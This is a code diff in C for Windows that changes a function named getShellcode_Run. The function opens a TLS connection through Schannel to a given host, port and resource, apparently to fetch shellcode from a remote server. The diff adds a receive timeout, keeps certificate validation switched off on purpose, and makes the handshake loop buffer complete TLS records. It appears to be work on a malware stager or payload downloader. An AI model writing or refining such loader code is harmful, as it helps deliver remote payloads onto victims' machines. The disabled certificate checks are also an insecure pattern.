@@ -434,16 +434,27 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     }
     DebugLog("Connected to server on socket %d\n", (int)ConnectSocket);
 
+    // Set receive timeout to 5 seconds
+    int timeout = 5000; // 5 seconds
+    iResult = setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+    if (iResult == SOCKET_ERROR) {
+        DebugLog("setsockopt (SO_RCVTIMEO) failed: %d\n", WSAGetLastError());
+        closesocket(ConnectSocket);
+        WSACleanup();
+        return;
+    }
+    DebugLog("Set receive timeout to 5 seconds\n");
+
     // Initialize security context for SSL/TLS
     SCHANNEL_CRED schannelCred = {0};
     schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
-    // Force TLS 1.2 to match the successful openssl test
+    // Use TLS 1.2 to match the successful openssl test
     schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
     // Keep bypassing certificate validation for now
     schannelCred.dwFlags = SCH_CRED_NO_SERVERNAME_CHECK | SCH_CRED_MANUAL_CRED_VALIDATION;
 
     TimeStamp tsExpiry;
-    secStatus = AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
+    secStatus = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
                                           NULL, &schannelCred, NULL, NULL, &hCred, &tsExpiry);
     if (secStatus != SEC_E_OK) {
         DebugLog("AcquireCredentialsHandle failed: %x\n", secStatus);
@@ -493,16 +504,35 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     inBuffer.ulVersion = SECBUFFER_VERSION;
 
     do {
-        if (inBuffers[0].cbBuffer == 0) {
-            iResult = recv(ConnectSocket, sslBuf, sizeof(sslBuf), 0);
+        if (inBuffers[0].cbBuffer < 5) { // Need at least 5 bytes to read the TLS record header
+            iResult = recv(ConnectSocket, sslBuf + inBuffers[0].cbBuffer, sizeof(sslBuf) - inBuffers[0].cbBuffer, 0);
             if (iResult <= 0) {
                 DebugLog("recv (handshake) failed or connection closed: %d\n", WSAGetLastError());
                 goto Cleanup;
             }
-            inBuffers[0].cbBuffer = iResult;
-            DebugLog("Received %d bytes for handshake: first 16 bytes: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
+            inBuffers[0].cbBuffer += iResult;
+            DebugLog("Received %d bytes for handshake: total buffer size now %d\n", iResult, inBuffers[0].cbBuffer);
+            DebugLog("First 16 bytes: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
                      sslBuf[0], sslBuf[1], sslBuf[2], sslBuf[3], sslBuf[4], sslBuf[5], sslBuf[6], sslBuf[7],
                      sslBuf[8], sslBuf[9], sslBuf[10], sslBuf[11], sslBuf[12], sslBuf[13], sslBuf[14], sslBuf[15]);
+        }
+
+        // Check if we have enough bytes to read the record length
+        if (inBuffers[0].cbBuffer >= 5) {
+            unsigned short recordLen = (sslBuf[3] << 8) + sslBuf[4];
+            DebugLog("TLS record length: %d bytes\n", recordLen);
+            while (inBuffers[0].cbBuffer < recordLen + 5) {
+                iResult = recv(ConnectSocket, sslBuf + inBuffers[0].cbBuffer, (recordLen + 5) - inBuffers[0].cbBuffer, 0);
+                if (iResult <= 0) {
+                    DebugLog("recv (additional handshake data) failed or connection closed: %d\n", WSAGetLastError());
+                    goto Cleanup;
+                }
+                inBuffers[0].cbBuffer += iResult;
+                DebugLog("Received additional %d bytes for handshake: total buffer size now %d\n", iResult, inBuffers[0].cbBuffer);
+                DebugLog("First 16 bytes: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
+                         sslBuf[0], sslBuf[1], sslBuf[2], sslBuf[3], sslBuf[4], sslBuf[5], sslBuf[6], sslBuf[7],
+                         sslBuf[8], sslBuf[9], sslBuf[10], sslBuf[11], sslBuf[12], sslBuf[13], sslBuf[14], sslBuf[15]);
+            }
         }
 
         secStatus = InitializeSecurityContextA(&hCred, &hContext, (SEC_CHAR*)host, dwFlags, 0, 0,
